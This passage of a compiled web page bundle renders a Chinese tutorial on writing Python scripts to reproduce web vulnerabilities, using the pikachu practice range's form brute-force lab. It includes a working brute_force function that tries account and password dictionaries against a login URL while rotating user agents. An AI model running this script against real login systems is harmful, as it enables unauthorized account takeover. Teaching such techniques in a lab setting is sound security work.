"),n("code",null,"user-agent"),s(" 也可以不要, 不过全部保留也是可以的")],-1),B={href:"https://github.com/Ayusummer/DailyNotes/blob/main/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/browsers.json",target:"_blank",rel:"noopener noreferrer"},A=n("code",null,"user-agent",-1),T=t(`<p>关于该 json 文件处理的函数如下</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">getUserAgentList</span><span class="token punctuation">(</span>browers_json_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;读取 browsers.json 返回 user-agent 列表  
    
    Args:
        browers_json_path: browsers.json 文件路径(绝对路径)

    Returns:
        user-agent 列表
    &quot;&quot;&quot;</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>browers_json_path<span class="token punctuation">,</span> <span class="token string">&#39;r&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        header <span class="token operator">=</span> json_load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
    browsers <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string">&#39;browsers&#39;</span><span class="token punctuation">]</span>
    <span class="token comment"># 将所有键的值取出来组成一个列表</span>
    user_agent_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> key <span class="token keyword">in</span> browsers<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> item <span class="token keyword">in</span> browsers<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">:</span>
            user_agent_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> user_agent_list
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),R=t(`<hr><p>至此, 先决条件已经准备地差不多了, 可以开始写暴力破解的主体函数了</p><p>对于一个通用的暴力破解脚本, 需要准备 <code>接口URL</code> 和, <code>账密字典</code> 以及 <code>判断请求失败的关键字符串</code>, 这里额外增加了 <code>浏览器头 json 文件地址</code>, <code>关键信息匹配前后缀</code> 以及 <code>请求间隔时间</code> 来控制暴力破解速度</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">brute_force</span><span class="token punctuation">(</span>
        socket<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> url_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> 
        browers_json_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        account_dict_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> password_dict_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        prefix<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> suffix<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> fail_keyword<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        sleep_second<span class="token punctuation">:</span> <span class="token builtin">float</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;暴力破解

    Args:
        socket: socket 地址, host-ip:port 的形式  
        url_path: url 路径, 为 url 中 port 后面的 /path 部分   
        browers_json_path: 浏览器头信息 json 文件路径(绝对路径)  
        account_dict_path: 账号字典路径(绝对路径)  
        password_dict_path: 密码字典路径(绝对路径)  
        prefix: 匹配的前缀
        suffix: 匹配的后缀  
        fail_keyword: 失败关键字, 用于判断是否登录成功  
        sleep_second: 延时秒数, 应当为一个正的浮点数, 比如 1/0.1 对应 1s/0.1s

    Returns:
        登录成功的账号密码
    &quot;&quot;&quot;</span>
    <span class="token comment"># 读取字典文件到列表</span>
    account_list <span class="token operator">=</span> read_dict_to_list<span class="token punctuation">(</span>account_dict_path<span class="token punctuation">)</span>
    account_num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>account_list<span class="token punctuation">)</span>
    password_list <span class="token operator">=</span> read_dict_to_list<span class="token punctuation">(</span>password_dict_path<span class="token punctuation">)</span>
    password_num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>password_list<span class="token punctuation">)</span>
    <span class="token comment"># 最大需要尝试的次数</span>
    max_try <span class="token operator">=</span> account_num <span class="token operator">*</span> password_num
    <span class="token comment"># 已尝试的次数</span>
    try_num <span class="token operator">=</span> <span class="token number">0</span>

    user_agent_list <span class="token operator">=</span> getUserAgentList<span class="token punctuation">(</span>browers_json_path<span class="token punctuation">)</span>
    <span class="token comment"># user_agent_list 长度</span>
    user_agent_num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>user_agent_list<span class="token punctuation">)</span>

    <span class="token comment"># 遍历账号密码列表</span>
    <span class="token keyword">for</span> account <span class="token keyword">in</span> account_list<span class="token punctuation">:</span>
        <span class="token keyword">for</span> password <span class="token keyword">in</span> password_list<span class="token punctuation">:</span>
            <span class="token comment"># 编码 password 中的 &amp; 符号(使用 urlencode 会将 &amp; 符号编码为 %26)</span>
            password <span class="token operator">=</span> password<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;&amp;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;%26&quot;</span><span class="token punctuation">)</span>
            <span class="token comment"># 以 try_num % user_agent_num 为索引取 user_agent_list 中的 user_agent</span>
            user_agent <span class="token operator">=</span> user_agent_list<span class="token punctuation">[</span>try_num <span class="token operator">%</span> user_agent_num<span class="token punctuation">]</span>
            <span class="token comment"># 发送请求并返回响应结果</span>
            response <span class="token operator">=</span> post_request<span class="token punctuation">(</span>
                socket<span class="token operator">=</span>socket<span class="token punctuation">,</span> url_path<span class="token operator">=</span>url_path<span class="token punctuation">,</span>
                user_gent<span class="token operator">=</span>user_agent<span class="token punctuation">,</span>
                username<span class="token operator">=</span>account<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">,</span>
                prefix<span class="token operator">=</span>prefix<span class="token punctuation">,</span> suffix<span class="token operator">=</span>suffix
            <span class="token punctuation">)</span>
            <span class="token comment"># 判断是否登录成功</span>
            <span class="token keyword">if</span> fail_keyword <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;\\n当前响应结果为: </span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f&quot;login success! username: </span><span class="token interpolation"><span class="token punctuation">{</span>account<span class="token punctuation">}</span></span><span class="token string">, password: </span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                try_num <span class="token operator">+=</span> <span class="token number">1</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;\\r进度:</span><span class="token interpolation"><span class="token punctuation">{</span>try_num<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>max_try<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span>
                time_sleep<span class="token punctuation">(</span>sleep_second<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">&quot;破解失败, 可能是字典中无相应账号密码或者操作被限制&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p>至此, 暴力破解脚本已经完全函数化了, 只会需要的就是写个 <code>main</code> 函数, 然后把具体的参数传入即可</p>`,6),H={href:"https://github.com/Ayusummer/DailyNotes/blob/main/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/pikachu_BruteForce.py",target:"_blank",rel:"noopener noreferrer"},L=n("p",null,[n("img",{src:"http://cdn.ayusummer233.top/img/202211122131789.png",alt:"image-20221112213146767"})],-1),V=n("hr",null,null,-1),D=n("p",null,"至此, 全部的流程就完成了",-1),W=n("hr",null,null,-1);function N($,j){const a=o("ExternalLinkIcon");return i(),l("div",null,[r,n("p",null,[s("可在 "),n("a",u,[s("Professional / Community 2022.9.6 | Releases (portswigger.net)"),e(a)]),s(" 获取相应系统版本的 BurpSuit 安装包")]),n("blockquote",null,[n("p",null,[s("个人对 BurpSuit 使用的随笔可参阅 "),n("a",d,[s("BurpSuit | DailyNotes (ayusummer.github.io)"),e(a)])])]),m,k,v,n("blockquote",null,[n("p",null,[s("可在 "),n("a",h,[s("Download Python | Python.org"),e(a)]),s(" 获取相应系统版本的 Python 安装包")]),b]),g,n("blockquote",null,[n("p",null,[s("更多 Python 开发环境配置相关的内容可参阅 "),n("a",y,[s("安装 Python | DailyNotes (ayusummer.github.io)"),e(a)])])]),_,f,x,w,n("p",null,[n("a",q,[s("官网下载 VSCode"),e(a)]),s(" 速度比较慢, 可以在下载时将直链替换国内镜像地址, 以达到更快的下载速度.")]),E,n("p",null,[s("受限于 VSCode, curlconverter 扩展的版本会比其 web 端旧很多, 因此也可以在"),n("a",C,[s("其 Web 端 - Convert curl commands to code (curlconverter.com)"),e(a)]),s(" 来利用 cURL 命令生成对应的 Python 代码")]),S,n("blockquote",null,[P,n("p",null,[s("关于 user-agent 参数, 这里是读取了"),n("a",B,[s("一个浏览器请求头的 json"),e(a)]),s(" 文件, 意在每次发送求都用不同的 "),A,s(", 不过实际上需要配合其他伪装方式使用, 这里仅仅是因为有所了解所以加上了, 亦可以直接固定使用 burp 抓到的请求头")]),T]),R,n("p",null,[s("完整的脚本文件可参阅 "),n("a",H,[s("pikachu_bruteForce.py"),e(a)])]),L,V,D,W])}const F=p(c,[["render",N],["__file","index.html.vue"]]),I=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Web%E6%BC%8F%E6%B4%9E%E9%80%9A%E7%94%A8%E5%9E%8BPython%E5%A4%8D%E7%8E%B0%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/","title":"Web 漏洞通用型 Python 复现脚本编写指南 V1.0","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"前言","slug":"前言","link":"#前言","children":[]},{"level":2,"title":"应用场景","slug":"应用场景","link":"#应用场景","children":[]},{"level":2,"title":"环境准备","slug":"环境准备","link":"#环境准备","children":[{"level":3,"title":"BrupSuit","slug":"brupsuit","link":"#brupsuit","children":[]},{"level":3,"title":"Python","slug":"python","link":"#python","children":[]},{"level":3,"title":"VSCode","slug":"vscode","link":"#vscode","children":[]}]},{"level":2,"title":"演示实例 - 以 pikachu 靶场基于表单的暴力破解为例","slug":"演示实例-以-pikachu-靶场基于表单的暴力破解为例","link":"#演示实例-以-pikachu-靶场基于表单的暴力破解为例","children":[{"level":3,"title":"手工复现漏洞并使用 BurpSuit 拦截请求","slug":"手工复现漏洞并使用-burpsuit-拦截请求","link":"#手工复现漏洞并使用-burpsuit-拦截请求","children":[]},{"level":3,"title":"将 HTTP 请求保存下来并使用 REST Clinet 发送并拷贝 Linux curl 命令","slug":"将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令","link":"#将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令","children":[]},{"level":3,"title":"根据 curl 命令生成对应的可供参考的 Python 代码","slug":"根据-curl-命令生成对应的可供参考的-python-代码","link":"#根据-curl-命令生成对应的可供参考的-python-代码","children":[]},{"level":3,"title":"编写复现脚本","slug":"编写复现脚本","link":"#编写复现脚本","children":[]}]}],"git":{"createdTime":1668260389000,"updatedTime":1668734146000,"contributors":[{"name":"咸鱼型233","email":"ayusummer233@qq.com","commits":2},{"name":"233Official","email":"ayusummer233@qq.com","commits":1}]},"readingTime":{"minutes":15.25,"words":4576},"filePathRelative":"网络安全/Web安全/Web漏洞通用型Python复现脚本编写指南/index.md","localizedDate":"2022年11月12日","excerpt":"\\n<h2>前言</h2>\\n<p>在复现 Web 漏洞的过程中通常会发 HTTP 请求来进行攻击, 这个操作是可以用 Python 的 requests, urllib, aiohttp, httpx 等网络请求库实现的(在此项指南中以 requests 库为例)</p>\\n<p>因此如果需要重复复现漏洞或是批量复现漏洞的话, 那么编写通用脚本, 之后需要的时候只需要跑脚本即可验证复现情况</p>\\n<p>此项指南旨在为上述过程的快速实现做一个常规的梳理, 希望能够帮助到有相关需求的同学</p>\\n<hr>\\n<h2>应用场景</h2>\\n<p>对于攻击方可以通过发 HTTP 请求进行复现的 Web 漏洞</p>"}');export{F as comp,I as data};
